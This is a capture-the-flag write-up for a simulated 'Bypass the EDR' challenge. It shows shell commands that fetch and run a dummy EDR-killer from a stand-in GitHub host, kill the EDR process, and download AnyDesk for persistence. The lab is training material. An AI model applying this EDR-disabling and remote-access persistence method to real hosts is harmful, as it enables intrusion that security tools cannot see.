### O7 Bypass the EDR

**Task:**

You’ve leveraged your credentials to gain initial access to a host within The Lucky Lion's internal network—one step closer to your goal! However, maintaining access is critical in case you're booted out. A prudent move would be to install some remote management software to ensure future access.

However, this won’t be straightforward—The Lucky Lion's security measures are likely to interfere. Fortunately, a fellow member of The Mound has developed an EDR bypass tool called "f4c3st4b," specifically designed for the EDR identified earlier. The challenge is getting it onto the host.

**Objectives:**

- Download AnyDesk on the target machine.

*Note: This is more challenging than it appears!*

**Flag Format:**  
The flag will follow the format: `wicys2024{flag_goes_here}`. Acceptable variations include the full format or parts of it such as `{flag_goes_here}`.

**Required Tools:**

- Web Browser
- AnyDesk  
  **SIMULATED LINK:** [Download AnyDesk](https://anydesk.com.example/downloads/anydesk.bin)
- "f4c3st4b" EDR Killer  
  **SIMULATED LINK:** [Download facestab](https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab)

**Additional Resources:**

- [Ransomware gangs abuse Process Explorer driver to kill security software](https://www.bleepingcomputer.com/news/security/ransomware-gangs-abuse-process-explorer-driver-to-kill-security-software)
- [Target-HTTPD EDR Bypass](https://target-httpd.chals.io/shell/edr.html)

---

**Solution:**

The target environment is equipped with various deceptive elements, including a fake bash shell called NARSH ("Not A Real SHell"), simulated download links, and a dummy program called "f4c3st4b" modeled after "backstab." NARSH is a flawed web app that frequently crashes, necessitating restarts.

In this environment, common bash commands are available but with restricted functionality. For instance, the `ps` command is limited to `ps` and `ps -A`, and without `-A`, you won't see the PID of the EDR process, which is "10."

**Enumeration and Execution Strategy:**

Initially, it's essential to explore the shell. I discovered that the `/tmp` directory allowed execution permissions, and `/usr/bin/cguard` could run scripts with root privileges—this would be key to bypassing the EDR.

The `cguard` tool can be used to "download" files by running the correct scripts. I spent some time attempting to use `curl` through `cguard`, only to realize that `cguard` auto-downloads the "f4c3st4b" tool into `/tmp` once the correct URL is provided. However, this method did not work for downloading AnyDesk, as the task was more about mimicking the process of deploying a malicious driver onto the target.

**Strategy:**

1. Gain access to the target.
2. Download a malicious tool (e.g., `facestab`) using a service or script.
3. Run the tool to insert a vulnerable driver, enabling you to terminate processes.
4. Use the tool to kill the EDR process.

`facestab` is limited in functionality compared to the original backstab tool it was inspired by. Notably, the `help` command in `facestab` does not fully list all available options, deliberately omitting the `-k` command required to kill the EDR.

**Execution and Flag Retrieval:**

To execute `facestab`, you must call it using the URL initially used for its "download." Running this command simulates the termination of the EDR, allowing you to proceed with using `curl` to download AnyDesk and successfully retrieve the flag.

```
$ps -A
PID       CMD
10        /usr/bin/cguardd
100       narsh

$cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab /tmp/facestab -p 10
downloaded script to /tmp/facestab
successfully killed 10

$cguard --status
off

$curl https://anydesk.com.example/downloads/anydesk.bin
back to the GUI: wicys2024{anydeskanytime}
```

**Flag:** `wicys2024{anydeskanytime}`

